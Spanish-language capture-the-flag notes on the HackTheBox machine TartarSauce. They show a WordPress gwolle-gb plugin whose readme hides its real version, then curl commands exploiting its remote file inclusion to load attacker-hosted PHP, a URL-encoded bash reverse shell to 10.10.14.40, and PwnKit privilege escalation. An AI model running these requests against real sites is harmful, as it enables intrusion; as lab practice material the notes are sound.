PORT   STATE SERVICE
80/tcp open  http

-Hacemos Fuzzing y encontramos ruta al Wordpress:
	-http://tartarsauce.htb/webservices/wp/

-Enumeramos con wpscan y encontramos el siguiente plugin:
	-gwolle-gb - version 2.3.10

-Si nos vamos a el readme.txt del plugin encontramos este mensaje:
	-URL: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
		Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D

-Parece que la versión de 'gwolle-gb' que se está usando es la 1.5.3

-Buscamos exploits y es vulnerable a Remote File Inclusion (RFI):
	https://www.exploit-db.com/exploits/38861

### RFI to RCE - Creating php webshell

-Hacemos petición a nuestro archivo test.php:
	-curl -s -X GET 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.40/test.php'
		Respuesta: "GET /test.phpwp-load.php HTTP/1.0"

-Está haciendo la petición por defecto a un archivo llamado 'wp-load.php', asi que renombramos el archivo 'test.php' a 'wp-load.php' y volvemos a hacer la petición:
	-mv test.php wp-load.php
	-curl -s -X GET 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.40/'
		**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Cambiamos el contenido de 'wp-load.php' por una webshell y obtenemos acceso a la máquina:
	-curl -s -X GET 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.40/&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.40%2F1234%200%3E%261%27'
		www-data@TartarSauce:/$ whoami
			www-data

## Escalada de Privilegios

-Explotamos /usr/bin/pkexec con Pwnkit32
